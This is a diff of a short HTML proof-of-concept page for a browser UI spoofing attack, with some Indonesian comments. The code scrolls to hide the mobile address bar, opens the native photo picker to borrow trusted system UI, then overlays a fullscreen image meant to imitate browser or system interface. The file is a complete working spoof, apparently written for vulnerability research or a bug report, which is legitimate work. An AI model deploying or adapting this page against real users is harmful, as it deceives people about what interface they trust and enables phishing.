@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Security UI Spoof (Photo Picker)</title>
+  <title>UI Spoof PoC</title>
   <meta charset="utf-8">
   <meta name="viewport"
         content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
@@ -10,17 +10,19 @@
     html, body {
       margin: 0;
       padding: 0;
-      height: 200vh; /* penting utk scroll hide omnibox */
+      height: 200vh; /* buat scroll hide omnibox */
       background: #000;
       font-family: system-ui, sans-serif;
     }
 
     #spoof {
       position: fixed;
-      inset: 0;
+      top: 0;
+      left: 0;
       width: 100vw;
       height: 100vh;
-      object-fit: cover;
+      object-fit: contain;
+      background: #000;
       display: none;
       z-index: 9999;
     }
@@ -34,49 +36,38 @@
       text-align: center;
     }
 
-    input {
-      display: none;
-    }
+    input { display: none; }
   </style>
 </head>
 
 <body>
 
-<!-- 🔒 UI SPOOF -->
 <img id="spoof" src="spof2.png" alt="spoof-ui">
 
 <div id="content">
   <h1>Click anywhere</h1>
 </div>
 
-<!-- 📸 Photo Picker -->
 <input id="photoPicker" type="file" accept="image/*">
 
 <script>
-let triggered = false;
-
-// preload spoof image
-new Image().src = document.getElementById("spoof").src;
+let once = false;
 
 onclick = () => {
-  if (triggered) return;
-  triggered = true;
+  if (once) return;
+  once = true;
 
-  // 1️⃣ scroll dikit → omnibox hide
+  // hide omnibox
   window.scrollTo(0, 1);
 
-  // 2️⃣ trusted system UI
-  document.getElementById("photoPicker").click();
+  // trusted UI
+  photoPicker.click();
 };
 
 photoPicker.onchange = () => {
-  // user pilih foto ATAU cancel → PoC tetap lanjut
+  content.style.display = "none";
+  spoof.style.display = "block";
 
-  // 3️⃣ swap UI
-  document.getElementById("content").style.display = "none";
-  document.getElementById("spoof").style.display = "block";
-
-  // 4️⃣ fullscreen
   if (document.documentElement.requestFullscreen) {
     document.documentElement.requestFullscreen().catch(() => {});
   }
